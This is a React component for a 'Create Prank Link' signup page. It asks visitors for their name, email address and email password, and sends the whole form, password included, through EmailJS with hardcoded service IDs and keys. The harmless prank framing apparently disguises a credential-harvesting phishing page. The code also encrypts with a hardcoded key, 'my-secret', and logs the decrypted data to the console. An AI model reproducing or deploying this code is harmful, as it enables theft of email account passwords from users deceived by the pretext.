import React, { useRef, useState } from "react";
import emailjs from "emailjs-com";
import ClipboardJS from "clipboard";
import CryptoJS from "crypto-js";

    new ClipboardJS(".button");

const Signup = () => {
  const form = useRef();
  const [generateLink, setGenerateLink] = useState("");
  const [color, setColor] = useState("#FF0000");
    const [loading, setLoading] = useState(false);

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_lhejy69",
        "template_nbs380f",
        form.current,
        "6ij3zK70w4lm_cMJg"
      )
      .then(
        (result) => {
          setLoading(true)
          console.log("result", result.text);
          var ciphertext = CryptoJS.AES.encrypt(
            JSON.stringify(e.target[1].value),
            "my-secret"
          ).toString();
          console.log("encrypted", ciphertext);

          // Decrypt
          var bytes = CryptoJS.AES.decrypt(ciphertext, "my-secret");
          console.log("bytes", bytes);
          var decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
          console.log("decrypted", decryptedData);

          setGenerateLink(
            `${window.location.origin}/calculator?id=${ciphertext}`);
                      setLoading(false);

        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    <div className="container">
      <form ref={form} onSubmit={sendEmail}>
        <p>Welcome</p>
        <input type="text" name="user_name" placeholder="Enter Name" />
        <input type="email" name="user_email" placeholder="Enter Email" />

        <input
          type="password"
          name="user_password"
          placeholder="Enter Email Password"
        />

        <input type="submit" value="Create Prank Link" />
      </form>
      {loading &&<p>loading...</p>}
      {generateLink && (
        <div className="generatelink">
          <input id="input" type="text" value={generateLink} />
          <button
            className="button"
            data-clipboard-action="copy"
            data-clipboard-target="#input"
          >
            Copy To Clipboard
          </button>
        </div>
      )}

      <div className="drops">
        <div className="drop drop-1"></div>
        <div className="drop drop-2"></div>
        <div className="drop drop-3"></div>
        <div className="drop drop-4"></div>
        <div className="drop drop-5"></div>
      </div>
    </div>
  );
};
export default Signup;
